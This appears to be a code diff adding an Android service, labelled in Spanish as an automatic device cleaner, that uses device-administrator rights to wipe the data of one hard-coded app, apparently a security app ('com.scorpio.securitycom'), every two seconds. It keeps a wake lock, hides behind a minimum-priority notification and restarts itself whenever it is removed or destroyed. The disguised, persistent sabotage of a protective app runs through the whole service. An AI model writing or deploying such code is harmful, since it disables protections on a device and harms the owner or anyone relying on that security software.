@@ -1,2 +1,159 @@
-https://es.anotepad.com/notes/8yfap8ep
-2024-11-16 06:04:51.777 11274-11487 Looper                  com.apolo.apolo                      W  Slow delivery took 41363ms android.bg h=android.os.Handler c=<recycled PooledLambda@ee5b352> m=0
+package com.apolo.apolo;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.ServiceInfo;
+import android.os.Build;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Looper;
+import android.os.PowerManager;
+import android.util.Log;
+
+import androidx.core.app.NotificationCompat;
+
+import java.util.concurrent.Executor;
+import java.util.concurrent.Executors;
+
+public class ClearService extends Service {
+    private static final String TAG = "ClearService";
+    private static final String CHANNEL_ID = "clear_service_channel";
+    private static final int NOTIF_ID = 1;
+    private static final long INTERVAL_MS = 2000; // 2 segundos para evitar sobrecarga
+    private static final long WAKELOCK_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutos
+
+    private Handler handler;
+    private Runnable clearTask;
+    private DevicePolicyManager dpm;
+    private ComponentName adminComponent;
+    private Executor executor;
+    private PowerManager.WakeLock wakeLock;
+
+    private static final String TARGET_PACKAGE = "com.scorpio.securitycom";
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        createNotificationChannel();
+
+        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("Limpieza activa")
+                .setContentText("El sistema se está limpiando continuamente")
+                .setSmallIcon(R.mipmap.ic_launcher)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setCategory(Notification.CATEGORY_SERVICE)
+                .setOngoing(true)
+                .build();
+
+        if (Build.VERSION.SDK_INT >= 34) {
+            startForeground(NOTIF_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+        } else {
+            startForeground(NOTIF_ID, notification);
+        }
+
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        if (pm != null) {
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG + ":WakeLock");
+            wakeLock.acquire(WAKELOCK_TIMEOUT_MS);
+        }
+
+        handler = new Handler(Looper.getMainLooper());
+        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        adminComponent = new ComponentName(this, MyAdminReceiver.class);
+        executor = Executors.newSingleThreadExecutor();
+
+        setupClearTask();
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        handler.removeCallbacks(clearTask);
+        handler.post(clearTask);
+        return START_REDELIVER_INTENT;
+    }
+
+    private void setupClearTask() {
+        clearTask = new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    renewWakeLockIfNeeded();
+
+                    if (dpm != null && adminComponent != null && dpm.isAdminActive(adminComponent)) {
+                        // Solo limpieza de datos internos
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                            dpm.clearApplicationUserData(adminComponent, TARGET_PACKAGE, executor,
+                                    (packageName, succeeded) -> Log.i(TAG, "Limpieza: " + packageName + " - " + (succeeded ? "Éxito" : "Falló")));
+                        }
+                    }
+                } catch (Throwable t) {
+                    Log.e(TAG, "Error inesperado en clearTask, pero la limpieza continúa", t);
+                }
+                handler.postDelayed(this, INTERVAL_MS);
+            }
+        };
+    }
+
+    private void renewWakeLockIfNeeded() {
+        if (wakeLock != null && !wakeLock.isHeld()) {
+            Log.i(TAG, "WakeLock no estaba activo, renovando...");
+            wakeLock.acquire(WAKELOCK_TIMEOUT_MS);
+        }
+    }
+
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    CHANNEL_ID,
+                    "Servicio de Limpieza",
+                    NotificationManager.IMPORTANCE_MIN
+            );
+            channel.setDescription("Limpieza automática del dispositivo");
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
+        }
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        Intent restartService = new Intent(getApplicationContext(), ClearService.class);
+        startForegroundServiceCompat(restartService);
+        super.onTaskRemoved(rootIntent);
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (handler != null) {
+            handler.removeCallbacks(clearTask);
+        }
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+        }
+        stopForeground(true);
+
+        Intent restartService = new Intent(getApplicationContext(), ClearService.class);
+        startForegroundServiceCompat(restartService);
+    }
+
+    private void startForegroundServiceCompat(Intent intent) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent);
+        } else {
+            startService(intent);
+        }
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+}
